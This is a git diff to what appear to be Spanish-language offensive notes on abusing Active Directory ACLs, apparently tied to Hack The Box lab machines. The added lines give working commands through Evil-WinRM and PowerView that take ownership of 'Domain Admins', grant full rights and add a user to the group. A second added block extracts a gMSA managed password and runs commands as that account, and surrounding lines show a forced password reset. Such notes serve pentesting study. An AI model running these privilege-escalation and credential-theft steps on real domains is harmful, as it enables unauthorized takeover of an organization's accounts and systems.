@@ -94,6 +94,16 @@ PS C:\Users\tom\Desktop\AD Audit\BloodHound> $SecPassword = ConvertTo-SecureStri
 PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -Identity claire -AccountPassword $SecPassword 
 ```
 
+### Agregar usuario actual a un grupo
+
+```null
+*Evil-WinRM* PS C:\Temp> Import-Module .\PowerView.ps1
+*Evil-WinRM* PS C:\Temp> Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity maria
+*Evil-WinRM* PS C:\Temp> Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights All -PrincipalIdentity maria
+*Evil-WinRM* PS C:\Users\maria\Documents> net group "Domain Admins" maria /add /domain
+The command completed successfully.
+```
+
 ## Abuso WriteDacl
 
 ### Agregar usuario a un grupo
@@ -127,9 +137,10 @@ Calculating hashes for Current Value
 PS C:\Temp> $gmsa = Get-ADServiceAccount -Identity 'bir-adfs-gmsa' -Properties 'msDS-ManagedPassword'
 PS C:\Temp> $mp = $gmsa.'msDS-ManagedPassword'
 PS C:\Temp> $pass = ConvertFrom-ADManagedPasswordBlob $mp
-PS C:\Temp> ConvertTo-NTHash -Password $pass.SecureCurrentPassword 
-e1e9fd9e46d0d747e1595167eedcec0f 
-PS C:\Temp> ConvertFrom-ADManagedPasswordBlob $mp
+PS C:\Temp> $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
+PS C:\Temp> $cred = New-Object System.Management.Automation.PSCredential('search.htb\bir-adfs-gmsa',$SecPass)
+PS C:\Temp> Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
+search\bir-adfs-gmsa$ 
 ```
 
 ```null
